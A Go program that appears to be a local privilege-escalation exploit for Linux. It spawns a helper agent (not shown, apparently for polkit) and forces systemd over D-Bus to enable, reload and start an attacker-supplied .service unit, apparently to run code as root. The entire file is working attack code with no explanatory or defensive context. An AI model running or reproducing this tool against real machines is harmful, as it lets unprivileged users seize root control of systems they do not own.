package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/godbus/dbus/v5"
)

var SystemdName = "org.freedesktop.systemd1"
var SystemdInterface = "org.freedesktop.systemd1.Manager"
var SystemdObjectPath = "/org/freedesktop/systemd1"


func fork() {
	attr := &syscall.ProcAttr{
		Env:   os.Environ(),
		Files: []uintptr{os.Stdin.Fd(), os.Stdout.Fd(), os.Stderr.Fd()},
	}
	args := append(os.Args, "1")
	go syscall.ForkExec("/proc/self/exe", args, attr)
}

func main() {
	if !strings.HasSuffix(os.Args[1], ".service") {
		fmt.Println("[-] Unit file must end with .service")
		os.Exit(3)
	}

	abs, err := filepath.Abs(os.Args[1])
	if err != nil {
		fmt.Printf("[-] Unit file status error: %s\n", err)
		os.Exit(3)
	}

	if len(os.Args) <= 3 {
		fork()
	}

	var agent Agent
	go agent.StartAgent()
	time.Sleep(time.Millisecond * 500)

	if len(os.Args) == 2 {
		go MethodCallStartService(filepath.Base(abs))
	} else if len(os.Args) == 3 {
		go MethodCallEnableUnitFiles(abs)
	} else {
		go MethodReload()
	}

	select {}
}


func MethodCallStartService(ServiceName string) {
	fmt.Printf("[*] Starting systemd service '%s' ...\n", ServiceName)
	conn, err := dbus.ConnectSystemBus()
	defer conn.Close()
	if err != nil {
		fmt.Printf("[-] Error for connecting system bus: %s", err)
		os.Exit(1)
	}

	bus := conn.Object(SystemdName, dbus.ObjectPath(SystemdObjectPath))
	call := bus.Call(SystemdInterface+".StartUnit", 4, ServiceName, "replace")
	if call.Err != nil {
		fmt.Printf("[-] Error for starting systemd service: %s\n", call.Err)
	}
}

func MethodReload() {
	fmt.Println("[*] Reloading systemd daemon ...")
	conn, err := dbus.ConnectSystemBus()
	if err != nil {
		fmt.Printf("[-] Error for connecting system bus: %s", err)
		os.Exit(1)
	}

	bus := conn.Object(SystemdName, dbus.ObjectPath(SystemdObjectPath))
	message := CreateMessage(bus, SystemdInterface+".Reload")
	call := conn.Send(message, make(chan *dbus.Call, 1))
	if call.Err != nil {
		fmt.Printf("[-] Error for reloading daemon: %s\n", call.Err)
	}
}

func MethodCallEnableUnitFiles(ServiceName string) {
	fmt.Printf("[*] Enabling systemd unit file '%s' ...\n", ServiceName)
	conn, err := dbus.ConnectSystemBus()
	if err != nil {
		fmt.Printf("[-] Error for connectint system bus: %s", err)
		os.Exit(1)
	}

	bus := conn.Object(SystemdName, dbus.ObjectPath(SystemdObjectPath))
	message := CreateMessage(bus, SystemdInterface+".EnableUnitFiles", []string{ServiceName}, false, true)
	call := conn.Send(message, make(chan *dbus.Call, 1))
	if call.Err != nil {
		fmt.Printf("[-] Error for enabling unit file: %s\n", call.Err)
	}
}

func CreateMessage(obj dbus.BusObject, method string, args ...interface{}) *dbus.Message {
	iface := ""
	i := strings.LastIndex(method, ".")
	if i != -1 {
		iface = method[:i]
	}
	method = method[i+1:]
	msg := new(dbus.Message)
	msg.Type = dbus.TypeMethodCall
	msg.Flags = dbus.FlagAllowInteractiveAuthorization
	msg.Headers = make(map[dbus.HeaderField]dbus.Variant)
	msg.Headers[dbus.FieldPath] = dbus.MakeVariant(obj.Path())
	msg.Headers[dbus.FieldDestination] = dbus.MakeVariant(obj.Destination())
	msg.Headers[dbus.FieldMember] = dbus.MakeVariant(method)
	if iface != "" {
		msg.Headers[dbus.FieldInterface] = dbus.MakeVariant(iface)
	}
	msg.Body = args
	if len(args) > 0 {
		msg.Headers[dbus.FieldSignature] = dbus.MakeVariant(dbus.SignatureOf(args...))
	}
	return msg
}
